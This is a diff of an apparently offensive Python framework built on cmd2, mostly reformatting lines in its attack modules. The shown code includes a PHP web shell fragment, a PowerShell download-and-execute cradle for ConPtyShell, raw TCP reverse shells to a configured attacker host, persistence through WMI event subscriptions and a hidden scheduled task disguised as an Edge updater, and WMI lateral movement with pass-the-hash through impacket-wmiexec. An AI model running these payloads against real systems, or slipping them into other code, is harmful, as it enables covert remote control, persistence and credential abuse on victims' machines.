@@ -18,6 +18,7 @@ from modules.categories import persistence_category
 from utils import (
     check_lhost,
     copy2clip,
+    print_error,
     print_msg,
 )
 
@@ -76,7 +77,9 @@ if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}
         if not check_lhost(lhost):
             return
         print_msg("[+] Downloading ConPtyShell...")
-        self.cmd("wget -O sessions/ConPtyShell.ps1 https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/ConPtyShell.ps1 2>/dev/null || curl -o sessions/ConPtyShell.ps1 https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/ConPtyShell.ps1")
+        self.cmd(
+            "wget -O sessions/ConPtyShell.ps1 https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/ConPtyShell.ps1 2>/dev/null || curl -o sessions/ConPtyShell.ps1 https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/ConPtyShell.ps1"
+        )
         cmd = f"powershell -ep bypass -c \"IEX(New-Object Net.WebClient).downloadString('http://{lhost}:{lport}/ConPtyShell.ps1');Invoke-ConPtyShell {lhost} {lport}\""
         print_msg(f"[+] Run this on target: {cmd}")
         copy2clip(cmd)
@@ -116,6 +119,7 @@ if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}
         at a configurable interval. MITRE: T1546.003 WMI Event Subscription.
         """
         import shlex as _shlex
+
         args = _shlex.split(line) if line else []
 
         lhost = self.params["lhost"]
@@ -126,7 +130,7 @@ if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}
             f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
             f"while(($i=$s.Read($b,0,$b.Length))-ne0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
             f"$r=(iex $d 2>&1|Out-String);$v=$r+'PS '+(pwd).Path+'> ';"
-            f"$y=([text.encoding]::ASCII).GetBytes($v);$s.Write($y,0,$y.Length);$s.Flush()}};$c.Close()\""
+            f'$y=([text.encoding]::ASCII).GetBytes($v);$s.Write($y,0,$y.Length);$s.Flush()}};$c.Close()"'
         )
         interval = self._extract(args, "--interval") or "5"
 
@@ -173,6 +177,7 @@ Write-Host "[+] Check: Get-WmiObject __EventFilter -Namespace root\\subscription
         MITRE: T1047 WMI.
         """
         import shlex as _shlex
+
         args = _shlex.split(line) if line else []
 
         target = self._extract(args, "--target") or self.params.get("rhost", "")
@@ -182,17 +187,23 @@ Write-Host "[+] Check: Get-WmiObject __EventFilter -Namespace root\\subscription
         command = self._extract(args, "--command") or "whoami /all"
 
         if not target:
-            print_error("Usage: wmi_lateral --target <ip> [--user <u>] [--password <p>] [--hash <nt_hash>] [--command <cmd>]")
+            print_error(
+                "Usage: wmi_lateral --target <ip> [--user <u>] [--password <p>] [--hash <nt_hash>] [--command <cmd>]"
+            )
             return
 
         if nt_hash:
             print_msg(f"Executing via WMI (PTH) on {target}")
-            self.cmd(f"impacket-wmiexec -hashes :{nt_hash} -target-ip {target} {user or 'Administrator'}@{target} '{command}'")
+            self.cmd(
+                f"impacket-wmiexec -hashes :{nt_hash} -target-ip {target} {user or 'Administrator'}@{target} '{command}'"
+            )
         elif user and password:
             print_msg(f"Executing via WMI on {target}")
             self.cmd(f"impacket-wmiexec -target-ip {target} {user}:'{password}'@{target} '{command}'")
         else:
-            self.cmd(f"wmic /node:{target} /user:{user or 'Administrator'} /password:'{password}' process call create '{command}'")
+            self.cmd(
+                f"wmic /node:{target} /user:{user or 'Administrator'} /password:'{password}' process call create '{command}'"
+            )
 
     @cmd2.with_category(persistence_category)
     def do_wmi_scheduled_task(self, line=""):
@@ -205,6 +216,7 @@ Write-Host "[+] Check: Get-WmiObject __EventFilter -Namespace root\\subscription
         MITRE: T1053.005 Scheduled Task.
         """
         import shlex as _shlex
+
         args = _shlex.split(line) if line else []
 
         lhost = self.params["lhost"]
@@ -212,12 +224,12 @@ Write-Host "[+] Check: Get-WmiObject __EventFilter -Namespace root\\subscription
         task_name = self._extract(args, "--name") or "MicrosoftEdgeUpdateTaskUA"
         trigger = self._extract(args, "--trigger") or "startup"
         command = self._extract(args, "--command") or (
-            f"powershell -ep bypass -w hidden -c \""
+            f'powershell -ep bypass -w hidden -c "'
             f"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
             f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
             f"while(($i=$s.Read($b,0,$b.Length))-ne0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
             f"$r=(iex $d 2>&1|Out-String);$v=$r+'PS '+(pwd).Path+'> ';"
-            f"$y=([text.encoding]::ASCII).GetBytes($v);$s.Write($y,0,$y.Length);$s.Flush()}}\""
+            f'$y=([text.encoding]::ASCII).GetBytes($v);$s.Write($y,0,$y.Length);$s.Flush()}}"'
         )
 
         ps_script = f"""$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-ep bypass -w hidden -c "{command}"'
